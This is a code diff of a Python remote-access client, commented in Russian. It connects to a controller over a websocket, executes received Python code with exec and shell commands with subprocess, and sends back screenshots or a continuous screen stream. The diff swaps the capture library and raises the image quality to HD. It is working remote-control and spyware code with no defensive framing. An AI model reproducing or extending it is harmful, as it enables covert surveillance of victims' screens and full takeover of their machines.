@@ -8,8 +8,9 @@ import os
 import uuid
 from io import BytesIO
 import base64
-import pyautogui  # или PIL.ImageGrab для Windows
 import threading
+import mss
+from PIL import Image
 
 APPDATA_DIR = os.getenv("APPDATA") or os.path.expanduser("~/.config")
 ID_FILE = os.path.join(APPDATA_DIR, "id.txt")
@@ -42,14 +43,27 @@ def has_internet():
 # Флаг управления стримом
 stream_flag = {"running": False}
 
-async def send_screens(ws):
-    while stream_flag["running"]:
-        screenshot = pyautogui.screenshot().resize((800, 450))
+async def take_screenshot():
+    """Скриншот с улучшенным качеством"""
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]
+        sct_img = sct.grab(monitor)
+        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+        img = img.resize((1280, 720))  # HD
         buffer = BytesIO()
-        screenshot.save(buffer, format="JPEG", quality=70)
+        img.save(buffer, format="JPEG", quality=90)  # улучшенное качество
         encoded = base64.b64encode(buffer.getvalue()).decode()
-        await ws.send(json.dumps({"id": CLIENT_ID, "screen": encoded}))
-        await asyncio.sleep(0.2)  # ~5 FPS
+        return encoded
+
+async def send_screens(ws):
+    """Поток для постоянной отправки скринов"""
+    while stream_flag["running"]:
+        try:
+            encoded = await take_screenshot()
+            await ws.send(json.dumps({"id": CLIENT_ID, "screen": encoded}))
+        except Exception as e:
+            await ws.send(json.dumps({"id": CLIENT_ID, "error": f"Screenshot error: {e}"}))
+        await asyncio.sleep(0.3)  # ~5 FPS
 
 async def connect_and_listen(address):
     async with websockets.connect(f"wss://{address}") as ws:
@@ -68,22 +82,23 @@ async def connect_and_listen(address):
                 if cmd_type == "python":
                     exec(content, globals())
                     await ws.send(json.dumps({"id": CLIENT_ID, "output": "Python executed"}))
+
                 elif cmd_type == "cmd":
                     result = subprocess.getoutput(content)
                     await ws.send(json.dumps({"id": CLIENT_ID, "output": result}))
+
                 elif cmd_type == "screen":
-                    # Однократный скрин
-                    screenshot = pyautogui.screenshot().resize((800, 450))
-                    buffer = BytesIO()
-                    screenshot.save(buffer, format="JPEG", quality=70)
-                    encoded = base64.b64encode(buffer.getvalue()).decode()
+                    encoded = await take_screenshot()
                     await ws.send(json.dumps({"id": CLIENT_ID, "screen": encoded}))
+
                 elif cmd_type == "start_stream":
                     if not stream_flag["running"]:
                         stream_flag["running"] = True
                         asyncio.create_task(send_screens(ws))
+
                 elif cmd_type == "stop_stream":
                     stream_flag["running"] = False
+
             except Exception as e:
                 await ws.send(json.dumps({"id": CLIENT_ID, "error": str(e)}))
 
